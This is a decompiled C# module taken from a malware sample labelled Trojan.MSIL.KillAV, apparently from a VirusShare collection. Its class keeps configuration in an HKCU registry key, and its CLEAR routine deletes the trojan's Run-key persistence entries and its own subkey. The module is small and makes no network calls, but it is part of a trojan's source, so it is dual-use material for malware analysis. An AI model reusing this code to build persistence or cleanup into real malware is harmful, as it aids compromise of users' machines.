// Decompiled with JetBrains decompiler
// Type: n.NK
// Assembly: p, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 91D63E37-42E0-404C-97F4-07116ACD2D57
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.KillAV.ao-27eafab1bfbe5012a9dd5eb6a22a5e09a25b91a1b79c55ba29e0e7098dcc6f9f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;

namespace n
{
  [StandardModule]
  public sealed class NK
  {
    public static string Key = "HKEY_CURRENT_USER\\Software\\nKey";
    public static Registry R;

    public static void SetValue(ref string N, ref string V) => Registry.SetValue(NK.Key, N, (object) V, RegistryValueKind.String);

    public static string GetValue(ref string N, ref string DF)
    {
      string Left = Conversions.ToString(Registry.GetValue(NK.Key, N, (object) null));
      return Operators.CompareString(Left, (string) null, false) == 0 ? DF : Left;
    }

    public static void DeleteValue(ref string N)
    {
      Array Instance = (Array) Strings.Split(NK.Key, "\\");
      string name = NK.Key.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object) Instance, new object[1]
      {
        (object) 0
      }, (string[]) null), (object) "\\")), "");
      Registry.CurrentUser.OpenSubKey(name, true).DeleteValue(N);
    }

    public static void CLEAR()
    {
      string su = B.SU;
      B.SU = "*";
      if (Operators.CompareString(su, "*", false) != 0)
      {
        try
        {
          Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(su);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(su);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Array Instance = (Array) Strings.Split(NK.Key, "\\");
        Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object) Instance, new object[1]
        {
          (object) checked (Instance.Length - 1)
        }, (string[]) null)), false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
